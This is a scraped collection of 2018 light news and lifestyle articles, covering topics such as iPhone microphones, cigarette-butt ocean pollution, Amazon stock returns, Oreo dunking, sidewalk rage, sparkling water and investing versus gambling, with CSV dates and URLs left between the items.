It also helps with voice recognition, which is becoming increasingly important with the rise in popularity of virtual assistants like Siri and Google Assistant.

You can actually test your handset’s microphones if you don’t think they’re performing as well as they should be.

As Apple explains: “To test the primary microphone on the bottom of your iPhone, open Voice Memos and tap the record icon. Then speak into the microphone and tap the play icon to play back the recording. You should be able to hear your voice clearly.

“If your voice sounds faint when you’re using the speakerphone on a phone call, make sure that your iPhone receiver isn’t blocked or covered.

“If audio from video recordings sounds faint, or Siri can’t hear you, make sure that the microphone near the iSight camera—on the top, back corner of your iPhone—and the receiver isn’t blocked or covered.”",Why the iPhone has a mysterious little hole next to its camera,

Plastic Straws Aren't Our Biggest Problem When It Comes To Ocean
Waste
",8/09/2018 7:42,https://www.iflscience.com/environment/there-is-something-even-worse-than-plastic-straws-when-it-comes-to-ocean-waste/,"The world has enjoyed picking up on plastic straws recently when it comes to ocean waste, despite them accounting for just 0.02 percent of ocean waste. But there are bigger fish to fry.

One of those appears to be cigarette butts, according to a report by NBC News. They reported it was the number one human-caused contaminant in the world’s oceans, and it has managed to avoid regulation so far.

The main issue appears to from cigarette filters, which Thomas Novotny, professor of public health at San Diego State University, told NBC News had “no health benefit”. He added that it “seems like a no-brainer to me that we can’t continue to allow this.”

The filters of the 5.6 trillion cigarettes (two-thirds of which are dumped irresponsibly) made around the world each year are composed of cellulose acetate, which can take more than a decade to decompose. Since 1986 cigarette butts have been the most collected item of ocean beaches, with about 60 million found in 32 years.

Filters were invented in the mid-1900s to alleviate health concerns from cigarettes, but have now become a major problem. A 2011 study by Professor Novotny found that getting smokers to stop flicking the ends of their cigarettes was difficult, with anti-litter campaigns and permanent ashtrays being unsuccessful.

A campaign called the Cigarette Butt Pollution Project is now hoping to change attitudes towards cigarette filters. “Cigarette butt waste has polluted our beaches, parks, and communities long enough – it’s time to take action!” they wrote on their website.

Some steps have already been taken to tackle the problem around the world. In the US, attempts have been made to pass legislation to ban filters, or raising cigarette pack costs to cover clean-up funds.

And earlier this month, we reported on a theme park in France that had trained some of its rooks to pick up litter and cigarette butts, with the goal being to show that “nature itself can teach us to take care of the environment.”

So while the war on plastic straws is undoubtedly good news – demonstrating just how easy it is to make a small change to your daily life – there is still much further to go to clean up our oceans. Cracking down on cigarette butts would be a good step.",There Is Something Even Worse Than Plastic Straws When It Comes To Ocean Waste,

If you invested $1,000 in Amazon in 1997, here's how much you'd

",7/09/2018 9:53,https://www.cnbc.com/2018/08/31/if-you-put-1000-dollars-in-amazon-in-1997-heres-how-much-youd-have-now.html,"It's been almost a year since Amazon closed its deal to purchase Whole Foods and the verdict is in for shareholders of the online retail giant. Amazon's stock has more than doubled over the past year, outperforming other publicly traded grocery chains by a wide margin. Since the Amazon-Whole Food deal closed, the S&P 500 index has been up 18 percent.

As impressive as that is, original investors in Amazon fare even better. If you had invested $1,000 during Amazon's IPO in May 1997, your investment would be worth $1,341,000 as of August 31, according to CNBC calculations.

That's better than the so-called FAANG stocks, plus Ebay – which debuted in that same period. Apple's gain, which was the second highest at a nearly 58,000 percent, is notable, but it also had a 17-year head start and its return is still less than half of Amazon's.

Amazon is not only crushing the competition from other grocery stores; it continues to reign supreme in retail as well. Since its IPO in May 1997, Amazon has gained over 134,000 percent, far surpassing other competitors.

It's also worth noting that Amazon began as an online bookstore before it grew and diversified. Barnes & Noble, another book retailer, has seen the value of its stock go down nearly by half.

Despite Amazon's remarkable stock performance, any individual stock can over- or under-perform and past returns do not predict future results.

Want to invest in the next Amazon? Research your options carefully before jumping into the stock market. Experienced investors like Warren Buffett recommend starting out with index funds. These investments hold every stock in an index like the S&P 500, and offer low fees. They also fluctuate with the market, so they offer less risk than picking individual stocks.

It all started when Esther Kezia Thorpe posted a photo of her friend's bridal gown on Twitter on Sunday.

""STOP EVERYTHING so one of my friends got married yesterday and she had POCKETS ON HER WEDDING DRESS,"" she wrote along with a photo of the beautiful dress.

She called the pockets “the best thing I have ever seen,” and plenty of others agree. Her tweet quickly went viral, racking up more than 10,000 likes and shares in only one day.

She's living the dream. — Tanu (@Mrs_Tonks) September 3, 2018

As anyone who shops for the one-piece garment knows, finding a simple dress with pockets is tough — and probably even more so when it comes to a wedding gown.

But pockets are basically the perfect solution for brides who don’t want to carry a separate purse throughout their wedding day. They're the ideal place to store tissues for sniffles during the ceremony, mints for that special kiss, lipstick for touch ups and any other small wedding day must-have items.

Ingenious! @EstherKeziaT/Twitter

The bride wishes to keep her identity private, but Kezia Thorpe confirmed to TODAY Style that the beautiful strapless dress was created by British designer Suzanne Neville.

The viral photo inspired many other women to post photos of their own wedding dresses with pockets too.

KFC gives huge sum of money to parents who named newborn daughter after Colonel Sanders

KFC has given an enormous sum of money to a family who named their newborn daughter after the chain's founder Colonel Sanders.

The little girl's college fund is $11,000 (£8,600) larger after her parents deliberately named Harland Rose after Colonel Harland Sanders in a baby naming competition.

The idea is to give the old-timey name a boost among youngsters.

KFC US wrote on Twitter: ""I'm as pleased as pumpkin punch to announce the winner of our Baby Harland Naming Contest and the Harland who will be ushering in an all-new generation of Harlands, little Harland Rose.""

Baby Harland Rose was born on September 9, at 8lbs 1oz on what would have been the Colonel's 128th birthday, according to the fast food giant.

Harland was given $11,000 towards her education as a nod to the 11 different herbs and spices KFC fry their chicken in - nice.

The company announced the competition back in August, stipulating that the first family to name their baby Harland on September 9 would receive the huge sum of money.

The news has divided people on social media, who have differing opinions on the announcement.

One wrote ""Poor kid"" on KFC's post, while another wrote: ""Pffft! She was named after a fried chicken joint!""

Someone replied: ""She was not named after a fried chicken joint; she was named after one of the greatest entrepreneurs of all time. I would consider it an honor.""

Others speculated about how the parents will explain the name choice to their daughter in the future.

One said: ""Lol, so the parents will have to explain to them how they named her in the future... 'Well honey, we were offered a lump sum of cash to name you after the CEO of a fast food chain'...""

The moment happened when Meghan and Harry joined the Hamilton cast for photos on stage. Meghan—who was standing in front of Harry—appears to have said ""can you see, my love?"" At which point the entire cast literally said ""AWWWWW,"" leaving Meghan looking super embarrassed.

This Young Woman's Life Advice Before She Died Is Everything

This woman's final post before she died went viral

",2/09/2018 13:00,https://www.businessinsider.com.au/this-elegant-life-advice-from-an-australian-woman-who-died-of-cancer-at-27-is-going-viral-2018-1,"A post written by a 27-year old Australian woman who died of cancer last week has gone viral on Facebook with almost 50,000 shares and 60,000 likes.

Holly Butcher from Grafton, Australia, suffered from Ewing’s sarcoma, which is often found in the bone and surrounding soft tissue.

She wrote the note before her death last Thursday, and asked her friends and family to post it to her Facebook after she died.

The post includes simple life advice on how to accept life as it is, and not to get upset about small things that don’t really matter, such as not getting enough sleep, not having the body shape you really want, or spending too much time worrying that your perceived life on social media doesn’t meet the expectations of others.

She suggests that life is more about spending time with others, giving rather than receiving, and has one very good reason as to why you should never be late meeting a friend.

Below is a section of her moving post, which you can read in full here.

Be grateful for each day you don’t have pain and even the days where you are unwell with man flu, a sore back or a sprained ankle, accept it is shit but be thankful it isn’t life threatening and will go away.

Whinge less, people! .. And help each other more.

Give, give, give. It is true that you gain more happiness doing things for others than doing them for yourself. I wish I did this more. Since I have been sick, I have met the most incredibly giving and kind people and been the receiver of the most thoughtful and loving words and support from my family, friends and strangers; More than I could I ever give in return. I will never forget this and will be forever grateful to all of these people.

It is a weird thing having money to spend at the end.. when you’re dying. It’s not a time you go out and buy material things that you usually would, like a new dress. It makes you think how silly it is that we think it is worth spending so much money on new clothes and ‘things’ in our lives.

Buy your friend something kind instead of another dress, beauty product or jewellery for that next wedding. 1. No-one cares if you wear the same thing twice 2. It feels good. Take them out for a meal, or better yet, cook them a meal. Shout their coffee. Give/ buy them a plant, a massage or a candle and tell them you love them when you give it to them.

Value other people’s time. Don’t keep them waiting because you are shit at being on time. Get ready earlier if you are one of those people and appreciate that your friends want to share their time with you, not sit by themselves, waiting on a mate. You will gain respect too! Amen sister.

This year, our family agreed to do no presents and despite the tree looking rather sad and empty (I nearly cracked Christmas Eve!), it was so nice because people didn’t have the pressure of shopping and the effort went into writing a nice card for each other. Plus imagine my family trying to buy me a present knowing they would probably end up with it themselves.. strange! It might seem lame but those cards mean more to me than any impulse purchase could. Mind you, it was also easier to do in our house because we had no little kiddies there. Anyway, moral of the story- presents are not needed for a meaningful Christmas. Moving on.

Use your money on experiences.. Or at least don’t miss out on experiences because you spent all your money on material shit.

Put in the effort to do that day trip to the beach you keep putting off. Dip your feet in the water and dig your toes in the sand. Wet your face with salt water.

Get amongst nature.

Try just enjoying and being in moments rather than capturing them through the screen of your phone. Life isn’t meant to be lived through a screen nor is it about getting the perfect photo.. enjoy the bloody moment, people! Stop trying to capture it for everyone else.

Random rhetorical question. Are those several hours you spend doing your hair and make up each day or to go out for one night really worth it? I’ve never understood this about females ????.

Get up early sometimes and listen to the birds while you watch the beautiful colours the sun makes as it rises.

Listen to music.. really listen. Music is therapy. Old is best.

Cuddle your dog. Far out, I will miss that.

Talk to your friends. Put down your phone. Are they doing okay?

Travel if it’s your desire, don’t if it’s not.

Work to live, don’t live to work.

Seriously, do what makes your heart feel happy.

Eat the cake. Zero guilt.

Say no to things you really don’t want to do.

Don’t feel pressured to do what other people might think is a fulfilling life.. you might want a mediocre life and that is so okay.

Tell your loved ones you love them every time you get the chance and love them with everything you have.

Also, remember if something is making you miserable, you do have the power to change it – in work or love or whatever it may be. Have the guts to change. You don’t know how much time you’ve got on this earth so don’t waste it being miserable. I know that is said all the time but it couldn’t be more true.

Anyway, that’s just this one young gals life advice. Take it or leave it, I don’t mind!

Oh and one last thing, if you can, do a good deed for humanity (and myself) and start regularly donating blood. It will make you feel good with the added bonus of saving lives. I feel like it is something that is so overlooked considering every donation can save 3 lives! That is a massive impact each person can have and the process really is so simple.

Blood donation (more bags than I could keep up with counting) helped keep me alive for an extra year – a year I will be forever grateful that I got to spend it here on Earth with my family, friends and dog. A year I had some of the greatest times of my life.

..’Til we meet again.

Attention, attention! The answer to one of the most pressing questions of all time — that is, how long should one dunk an oreo for the best possible bite? — has finally been discovered. That question, which we have surely all pondered at least once, was taken to the lab by a group of mechanical engineers at Utah State University who felt it was their destiny to determine the prime dunking time for an Oreo to be best devoured.

As Grub Street reports, the researchers discovered that the “peak time” to dunk an Oreo in milk is — drumroll, please — for four seconds. They found that the cookie will soak up 50 percent of the fluid in the first second it hits the milk, and by the fourth second, the Oreo has reached “maximum absorption,” and should be consumed. And because it’s Thirsty Thursday, and a glass of almond milk is less guilty-inducing than a margarita, we say treat yo’self. Happy dunking!

",31/08/2018 15:09,https://www.iflscience.com/plants-and-animals/heres-what-to-do-if-attacked-by-swarm-wasps-bees/,"You know what you absolutely shouldn’t do if you see a wasp nest holed up inside your property? Attack it yourself. Although YouTube videos make it seem tempting to use detergent, vacuum cleaners, or even explosives (hi there, America) to clear out the invading critters with their stinging butt javelins, you really should call a professional.

Either way, it seems that enough of you have been chased by a swarm of wasps – in some cases, after accidentally disturbing their nests – for BBC News and a few other places to explain what best to do in this situation.

To be fair, wasps, whether you’re dealing with yellowjackets or hornets, as well as bees can be pretty dangerous. Per Lifehacker, they account for 33 percent of all animal-related deaths for over-20s in the US. The collective injection of their venom into your body can certainly provoke some horrific and sometimes deadly reactions, that’s for sure, so knowing what to do in the event of an attack is paramount.

So – what should you do? The best advice is pretty obvious: don’t go near their nests. If you leave them alone, they won’t feel threatened and they’ll leave you be too, contrary to what your instinctual fears may be telling you.

The UK’s National Health Service (NHS) offers some important advice that’s admittedly difficult to stick to. “Remain calm and move away slowly if you encounter wasps, hornets or bees,” a blog post explains. “Don't wave your arms around or swat at them.” If you do, you’ll just provoke them to attack you further, as you’ll look more threatening.

You shouldn’t even swat at them individually. If you do, they may release pheromones that attract more wasps or bees your way, according to the British Pest Control Association.

If you're somewhere in the Americas and you get particularly unlucky, the swarm may be comprised of Africanized honey bees. Although featuring less venom per bee than others, their swarms are more populous, faster, and more aggressive.

Researchers found that study participants who listened to music for 30 to 45 minutes before bed every night for three months fell asleep more quickly, slept more deeply, and felt better the next morning. The catch: The songs they listened to were all set at tempos between 60 and 80 beats per minute—our approximate heart rate when falling asleep. (Here are more secrets for a deeper sleep.)

That’s right: You can literally trick your body into relaxing by syncing your heart rate with peaceful music. In this way, listening to music becomes a form of meditation; by mindfully listening to your surroundings, your heart rate slows, your blood pressure lowers, your anxiety abates, and life becomes a peaceful song.

Of course, the same is true of energetic music: The Royal Automobile Club Foundation for Motoring ranked Wagner’s “Ride of The Valkyries” as the world’s most dangerous song for motorists, thanks to a frenzied tempo (nearly 100 bpm) that challenges drivers’ normal sense of speed. (Saying “Sorry, officer, I was just Wagner-ing” probably is not going to get you out of a speeding ticket.)

Armed with findings about the irresistible link between backbeat and heartbeat, sleep therapists have even begun collaborating with musicians to create what could become known to history as the chillest music ever. In 2011, the English trio known as Marconi Union worked with the British Academy of Sound Therapy to create an eight-minute instrumental track called “Weightless,” designed to lull the listener into relaxation through proven heart-rate-lowering sounds and tempos (beginning at 60 bpm, and stealthily slowing to 50 bpm by the end.)

And it worked, too. In a recent UK study, participants challenged with solving difficult puzzles while listening to various types of music showed a whopping 65 per cent reduction in anxiety (and therefore an improvement in performance) while listening to “Weightless.” (That pretty much makes ""Weightless"" the anti-Valkyrie.) As an addendum, study moderator Dr. David Lewis-Hodgson of Mindlab International even said: “I would advise against driving while listening to the song because it could be dangerous.""

I present to you what is undoubtedly the greatest name for ​a football player in the entire history of the world thus far. A name so perfect, so stunningly beautiful that it makes you wonder whether this kid's parents were comedians in their spare time.

​​Yes, Steele Fortress!





The fact that his first name is Steele and not Steel makes this even better. It means that, to some extent at least, his parents weren't just intentionally naming him something funny. They actually just liked the name Steele, and the humor followed.





Also, it is obviously the synergy between first and last name that makes this so good. Sure, we've seen guys with a last name like Slaughter or something like that, but to have both names work so well together is pretty unique.

Better than Kobe BuffaloMeat?! pic.twitter.com/AwMkOR8sX5 — Kris Braun (@KristopherBraun) August 26, 2018

Mr. Fortress is an incoming freshman ​quarterback for the Michigan Tech squad, and you can bet that his teammates are not going to let him live down this name all season long.

​​My only question is: does this guy have siblings? And if so, what are their names?





Their parents can't have just named any other kids Tom, Joe, and Mary after having a son named Steele. We need investigative reporters on this immediately.

Of course, I usually like the sweet and dessert-like flavors the most, but other flavors can also be very intriguing. One of the newest international offerings from Oreo taps into some very unique foods for its newest cookies. With that, you might be wondering where to buy Oreo's Hot Chicken Wing and Wasabi flavors. Well, if you really want to get your hands on these spicy snacks, you'll need to grab your passport.

In a move that could turn the dessert-snack world on its head, Oreo's parent company, Mondelez International, introduced the Hot Chicken Wing and Wasabi flavors in a tweet on Tuesday, Aug. 21. Currently, these new flavors are only available in China, per Mondelez. So, if you're really set on trying these new spicy fillings that are sandwiched between the chocolate Oreo wafers that you know and love, you'll have to head to China. Elite Daily reached out to Mondelez for a more detailed flavor description of these head-turning flavors but did not hear back at the time of publication.

Unfortunately, I couldn't even find these hot cookies on Amazon at the time of publication.

OREO

TBH, I'm not sure if these new Oreo flavors will turn out to be unexpected food combinations that somehow totally makes sense — or if one bite will make you wish you kept your dinner and dessert flavors separated — but I guess there's only one way to find out.

One thing you can count on with these treats is guaranteed spice. Per Design Taxi, Oreo describes its new offerings as ""salty and spicy."" Oh, and don't be fooled by the vibrant orange and green colors at first glance, thinking that these might be some kind of creamsicle or matcha cookies (TBH, I totally thought the Wasabi cookie was a green tea flavor at first look), because Oreo told Design Taxi that these new offerings are flavors ""you never knew"" existed.

OREO

I tend to agree with the cookie company that I also never thought that I'd see a Hot Chicken Wing Oreo, yet here it is. Oreo lovers not living China will have to be satisfied with photos and descriptions of the new cookies, because China is currently the only location where you can buy these amped-up treats. If you're salivating over (or questioning the existence of) these Wasabi and Hot Chicken Wing Oreos in the United States, there are sadly no current plans for sale of the snack stateside, per Mondelez.

There's no need to get too bummed about the fact that you can't grab these flavors in the United States, because there are also plenty of new U.S. flavors that you can enjoy. If you're trying to keep that summer feeling as September quickly creeps up, you can get a quintessential taste of the season with Oreo State Fair Cookies, which are very similar to the deep-fried Oreos that you'll find at practically every state fair across the country.

One bite of the Oreo Sate Fair Cookie should ease any sadness you might have about not being able to chow down on Hot Chicken Wing Oreos. Here's to hoping Oreo's next savory AF flavor makes its way stateside.",This Is Where You Can Get Oreo's Chicken Wing & Wasabi Flavors For A Spicy Treat,

Studies Reveal How Often You Should Be Washing Your Bed

",29/08/2018 9:10,https://doyouremember.com/82876/how-often-you-should-wash-sheets,"It’s no secret every so often you should throw your bedsheets in the wash and replace them with new, clean sheets. Results from a 2015 study may surprise you as to how often you should be washing them. We originally published this back in 2018, but with the holiday season in full swing, clean bed sheets are a must for your out of town guests(even the inlaws). After all, no one wants to wake up with bed bugs. Dirty sheets are the perfect place for harboring those nasty critters.

Philip M. Tierno, a Clinical Professor for the Department of Pathology at NYU School of Medicine shared his insight on the truth about dirty bedsheets. In 2015 he told Tech Insider, “You have spores of fungi, bacteria, animal dander, pollen, soil, lint, finishing agents of whatever the sheets are made from, coloring material, all sorts of excrements from the body including sweat, sputum, vaginal, and anal excretions, urine milieu, skin cells.”… grossed out yet?

A 2015 study assessed the level of fungal contamination in bedding revealed between 4 and 17 different species of fungus(eww). They conducted this study with both feather and synthetic pillows ranging from one and a half to twenty years old. Tierno says that the number of bacteria and other types of debris that can accumulate in such a short time on our bedding should be a cause for concern when we leave our sheets for too long.

This Is What it Means if Slow Walkers Make You Furious

Researchers are starting to take pedestrian aggression more seriously.
",28/08/2018 15:14,https://www.vice.com/en/article/xwkpka/this-is-what-it-means-if-slow-walkers-make-you-furious,"Chances are you have felt it at least once in your life, if not every damned day: the bubbling rage working through your veins, filling your soul, consuming your being, as you find yourself trapped behind a slow walker. Whether targeting people for moseying on a busy walkway while using their phones, groups for spreading out and forming plodding barricades, or tourists for being, well, tourists, screeds against slow walkers are a dime a dozen online.

This anger is so common it actually has an academic designation: sidewalk rage. Leon James, a University of Hawaii psychologist and leading expert on the phenomenon, likens it to road rage. While we often talk about sidewalk rage as an internal irk, or “private mental venting that consists of irrational assumptions regarding other pedestrians,” the feelings can escalate through fantasies of “violent acts against the inconsiderate sidewalk blockers” in some to “the overt expression of hostility and aggressiveness,"" James notes. Yet for all most of us know about sidewalk rage, few understand where it comes from, or why some feel it more acutely—at times or always—than others.

Sign up for Coping, Tonic's weekly newsletter about anxiety, depression, and dealing with it all.

Fast walkers often imply—if cheekily—that their rage stems from the fact that they are, in a cosmic sense, in the right. They trot out studies that suggest faster walkers may be less likely to die of heart disease, develop Alzheimer’s disease, or see their prostate cancer worsen, and that slow walkers seem to die earlier than the fleeter footed. (The causality between walking speed and the outcomes noted in these studies remains uncertain; walking speed could actually have nothing to do with them, or stand in for some other causal factor.)

They also argue that slow walkers are breaking implicit social rules in a city or culture that dictate how to use a walkway. (To wit, in New York: keep to the right, follow the flow of foot traffic, watch where you’re going, don’t cluster up if you’re moving in a large group, and for god’s sake veer off to the edge of the sidewalk if you insist on stopping or slowing down.)

Psychologists suggest that the rage some of us feel stems primarily from our own expectations and emotional states. Many people walk on autopilot based on our own expectation of how long it will take us to reach our endpoint, notes Marc Wittmann of the Institute for Frontier Areas of Psychology and Mental Health. Finding someone suddenly blocking our path breaks our autopilot: “The more we are on autopilot mode,” Wittmann says, “the less we can accept a sudden slowed pace.”

More from VICE:

This jarring breech of our expectations is stressful. But of course, it's even more stressful if we are already in a stressed mode to begin with. What’s more, when this interruption of expectations triggers rage, it can warp our perception of time. Our lack of control and anger make us feel like the moments we spend trapped behind someone are an eternity, which risks annoying us further.

It's hardly surprising that city dwellers seem to report the most sidewalk rage. As Wittmann notes, urban centers seem to encourage a faster average pace, and the conveniences of modern life shred our patience. Competition for personal space can also trigger or exacerbate this rage, James says. So it's fairly easy for a fast-moving, impatient city dweller to run into a snag that breaks that autopilot pace and exacerbates the latent stress many busy people may feel.

Living in a city, however, is hardly the only predictor of sidewalk rage, James says. He sees it as a socially learned behavior, both from our parents and through media. So our training as we grow up regarding how to process or react to the inconveniences plays a strong role, too. James seems to believe that sidewalk rage is a growing problem, which makes sense given the fact that modern life, especially in cities, is getting faster—and for many, more stressful. While many people might brush this off as a minor annoyance of modernity, however, James says that he sees it as “a public mental health crisis that needs to be addressed and reversed,” to reduce the violence it sometimes creates, aid our wellbeing, and improve civility in public life.

Fortunately, it's not too difficult to quell feelings of sidewalk rage in the moment. Usually when we feel irritated by a slow walker—or a fast walker trying to muscle past us, James notes—we “recite the details of another pedestrian's ‘objectionable’ behavior',” which intensifies our negative feelings. We also tend to fixate on our own stress, like how late we’re running. We just have to break these mental patterns, James says, through “motivation and self-training” in our everyday life.

This often involves simply stopping and recognizing when we’re starting to feel rage, dissecting that feeling, and acknowledging that someone is not evil for moving at their own pace. In those moments, we also need to understand that we are the ones in “activation mode,” who likely need to learn how to switch into a more relaxed, accepting mode if there is nothing we can do to escape an inconvenience, Wittmann notes. “You become a happier human being,” he says, “when you are able to change modes. You have more control over your emotions and life.”

Some people may reject the idea that they need to change, still insisting that slow walkers are in the cultural or moral wrong. Those people will likely feel sidewalk rage all of their lives. But for those who want to conquer these feelings, this mental shift and control is not as hard to develop as it may seem, as there are many simple exercises one can do to cultivate it. “I advise nervous people to go to a supermarket and choose the longest line at the cashier booths,” Wittmann says. “Say to yourself: Now I have time for myself and I can relax for a moment.” Accept that a slow moment now and then is normal, perhaps even a gift, if you are willing to take it as such, rather than berating others for not moving at the same speed.",This Is What it Means if Slow Walkers Make You Furious,

So why did NASA choose to release images that look like sanitary towels? These people weren't the only ones who were curious about that.

Well, the answer is that the image is a composite of several different photos taken by Juno as it flies over. They are then stitched together to make one photo, rather than many smaller patchy photographs of the planet.

So why aren't the photos rectangular, like a panorama?

How Hydrating Is Sparkling Water, Anyway?
This scientific research gives a clear-cut answer.

Downing glasses of sparkling water can feel a little bit like cheating, because its effervescence is so similar to that of sugary soda. And with $1.8 billion sold in 2017 (thanks in large part to America’s current obsession with La Croix), it looks like lots of us enjoy the bubbly stuff.

The CDC recommends drinking sparkling water as a healthy alternative to soda and other high-calorie beverages, but is it really hydrating us just as well as a plain glass of still water?

While there are many brands, flavors and choices on the market, for the purpose of this article, we’re talking about unflavored sparkling water, or seltzer, which is simply water that has had pressurized carbon dioxide dissolved into it. The carbon dioxide is what creates that effervescence, or the bubbles, making sparkling water seemingly so much more fun than plain tap water.

A number of myths have been floating around the internet on the subject of sparkling water and its negative side effects. Now to dispel a few.

Myth 1: Sparkling water destroys tooth enamel.

Advertisement

Good news for sparkling water fans! The pH level of sparkling water (at a pH of 5) is not low enough to erode tooth enamel, according to a study published in the Journal of the American Dental Association. But while plain sparkling water’s carbonation doesn’t hurt tooth enamel, be careful about other fizzy drinks’ acids (think colas), which can wreak havoc on your oral health.

Check out the label on your sparkling water: It’s best to choose waters without added flavorings, sugars and citric acids if you’re concerned about your dental health, as these were found to have the most erosive potential for teeth.

Myth 2: Sparkling water leaches calcium from bones, potentially causing osteoporosis.

While studies have demonstrated that soda consumption is linked to decreased bone mineral density, particularly in women, this has to do with cola consumption specifically, rather than carbonated beverages. Rather, in another study in which researchers had one group of participants drink 1 liter of carbonated water a day and another group drink 1 liter of still a day for 8 weeks, no difference was detected between the two groups in terms of bone density loss.

Advertisement

Myth 3: Sparkling water is not as hydrating as water.

More good news: Sparkling water is just as hydrating as plain water.

The American Journal of Clinical Nutrition compared still, sparkling and other popular drinks (cola, juices, beer, coffee, tea and milk), finding that there was no difference between them in terms of hydration.

This may not jibe with what you’ve heard about coffee and tea having a dehydrating effect on our bodies, but studies have shown that habitual coffee and tea drinkers don’t get dehydrated by those beverages when consumed in moderation. In fact, coffee drinkers consuming a regular 3 to 6 cups a day weren’t found to have any changes to total body water. Essentially, regular caffeine consumption in the form of coffee and tea is hydrating as the body has become accustomed to the caffeine, which would otherwise act as a diuretic or a dehydrating factor. Irregular caffeine consumption in the form of tea and coffee, however, is dehydrating.

Back to sparkling water, though: The USDA does recommend sparkling water as a good alternative to sugary drinks as a good way to reduce your risk for obesity.

The only time you might want to choose still over sparkling is when you’re working out: The carbonation in sparkling water can cause a build-up of gas and lead to bloating and discomfort.",Does Sparkling Water Hydrate You As Well As Regular Water?,

Absurdly Driven looks at the world of business with a skeptical eye and a firmly rooted tongue in cheek.

You know that sinking feeling.

The one that comes immediately after you see or hear the word canceled associated with your flight.

You go through stages of anger, then hope, and then finally resignation.

Perhaps that's what happened to Paul Kuharevicz.

He was booked on a SkyWest United Express flight from Chicago's O'Hare airport to Muskegon in Michigan.

You might think the plane Muskegon without him. But no. It was simply canceled, leaving him with a decision to make.

He chose to rent a car and drive the more than 200 miles home. As Fox 17 reports, when he got home, he remembered that he'd left his bike at work.

So he drove there.

But on the way, he made one stop. At the Ladd's and Company convenience store.

There, he bought a Mega Millions lottery ticket.

No, he didn't win mega millions. Just a simple, cool $1 million.

Yes, it's surely less than Dr. David Dao got for being dragged, bloody-faced off a United flight earlier this year. Still, it's not a bad sum for his trouble.

If the flight had been on time, he'd likely have got home sooner. Perhaps he wouldn't have gone to work to pick up his bike.

Even if he had, it likely wouldn't have been at the same moment that he bought his ticket.

Pity turned to serendipity.

I contacted United to ask how it felt about being the unwitting impetus to good fortune. I will update, should I hear.

There's a touching lesson here, though.

Sometimes, a difficulty or a failure can seem all-encompassingly painful.

It can ruin your morning, your day, your week. Nay, your life.

Sometimes, though, it can lead to an unexpected joy--in this case, something that can change a life.

Kuharevicz said that thanks to the windfall, his wife can now happily retire.

How many times during a discussion about finances have you heard someone say, ""Investing in the stock market is just like gambling at a casino""? True, investing and gambling both involve risk and choice—specifically, the risk of capital with hopes of future profit. But gambling is typically a short-lived activity, while equities investing can last a lifetime. Also, there is a negative expected return to gamblers, on average and over the long run. On the other hand, investing in the stock market typically carries with it a positive expected return on average over the long run.

Key Takeaways Investing and gambling both involve risking capital in the hopes of making a profit.

In both gambling and investing, a key principle is to minimize risk while maximizing reward.

Gamblers have fewer ways to mitigate losses than investors do.

Investors have more sources of relevant information than gamblers do.

Over time, the odds will be in your favor as an investor and not in your favor as a gambler.

Investing

Investing is the act of allocating funds or committing capital to an asset, like stocks, with the expectation of generating an income or profit. The expectation of a return in the form of income or price appreciation is the core premise of investing. Risk and return go hand-in-hand in investing; low risk generally means low expected returns, while higher returns are usually accompanied by higher risk.

Investors must always decide how much money they want to risk. Some traders typically risk 2-5% of their capital base on any particular trade. Longer-term investors constantly hear the virtues of diversification across different asset classes. However, risk and return expectations can vary widely within the same asset class, especially if it's a large one, as the equities class is. For example, a blue-chip stock that trades on the New York Stock Exchange will have a very different risk-return profile from a micro-cap stock that trades on a small exchange.

This, in essence, is an investment risk management strategy: Spreading your capital across different assets, or different types of assets within the same class, will likely help minimize potential losses.

In order to enhance their holdings' performance, some investors study trading patterns by interpreting stock charts. Stock market technicians try to leverage the charts to glean where the stock is going in the future. This area of study dedicated to analyzing charts is commonly referred to as technical analysis.

Investment returns can be affected by the amount of commission an investor must pay a broker to buy or sell stocks on their behalf.

When you gamble, you own nothing, but when you invest in a stock, you own a share of the underlying company; in fact, some companies actually reimburse you for your ownership, in the form of stock dividends.

Gambling

Gambling is defined as staking something on a contingency. Also known as betting or wagering, it means risking money on an event that has an uncertain outcome and heavily involves chance.

Like investors, gamblers must also carefully weigh the amount of capital they want to put ""in play."" In some card games, pot odds are a way of assessing your risk capital versus your risk-reward: the amount of money to call a bet compared to what is already in the pot. If the odds are favorable, the player is more likely to ""call"" the bet.

Most professional gamblers are quite proficient at risk management. They research player or team history, or a horse's bloodlines and track record. Seeking an edge, card players typically look for cues from the other players at the table; great poker players can remember what their opponents wagered 20 hands back. They also study the mannerisms and betting patterns of their opponents with the hope of gaining useful information.

In casino gambling, the bettor is playing against ""the house."" In sports gambling, and in lotteries—two of the most common ""gambling"" activities in which the average person engages—bettors are in a sense betting against each other because the number of players helps determine the odds. In horse racing, for example, placing a bet is actually a wager against other bettors: The odds on each horse are determined by the amount of money bet on that horse, and constantly change up until the race actually starts.

Generally, the odds are stacked against gamblers: The probability of losing an investment is usually higher than the probability of winning more than the investment. A gambler's chances of making a profit can also be reduced if they have to put up an additional amount of money beyond their bet, referred to as ""points,"" which is kept by the house whether the bettor wins or loses. Points are comparable to the broker commission or trading fee an investor pays.

Investing vs. Gambling: Key Differences

In both gambling and investing, a key principle is to minimize risk while maximizing profits. But when it comes to gambling, the house always has an edge—a mathematical advantage over the player that increases the longer they play.

In contrast, the stock market constantly appreciates over the long term. This doesn't mean that a gambler will never hit the jackpot, and it also doesn't mean that a stock investor will always enjoy a positive return. It is simply that over time, if you keep playing, the odds will be in your favor as an investor and not in your favor as a gambler.

""Neither get in nor get out is an investing strategy. Period. That's just gambling on moments in time. And investing should always be a disciplined process over time,"" said Liz Ann Sonders, managing director & chief investment strategist of Charles Schwab.

Mitigating Loss

Another key difference between investing and gambling: You have few ways to limit your losses. If you pony up $10 a week for the NFL office pool and you don't win, you're out all of your capital. When betting on any pure gambling activity, there are no loss-mitigation strategies. Newer innovations to online sportsbooks have been added to help gamblers mitigate risks when betting on games such as in-play bettering, which can be changed throughout gameplay, and partial cash-out options, which allow recovery of part of one's wager if an outcome seems to be going against the best.

In contrast, stock investors and traders have a variety of options to prevent total loss of risked capital. Setting stop losses on your stock investment is a simple way to avoid undue risk. If your stock drops 10% below its purchase price, you have the opportunity to sell that stock to someone else and still retain 90% of your risk capital. However, if you bet $100 that the Jacksonville Jaguars will win the Super Bowl this year, you cannot get part of your money back if they just make it to the Super Bowl. And even if they did win the Super Bowl, don't forget about that point spread: If the team does not win by more points than given by the bettor, the bet is a loss.

The Time Factor

Another key difference between the two activities has to do with the concept of time. Gambling is a time-bound event, while an investment in a company can last several years. With gambling, once the game or race or hand is over, your opportunity to profit from your wager has come and gone. You either have won or lost your capital.

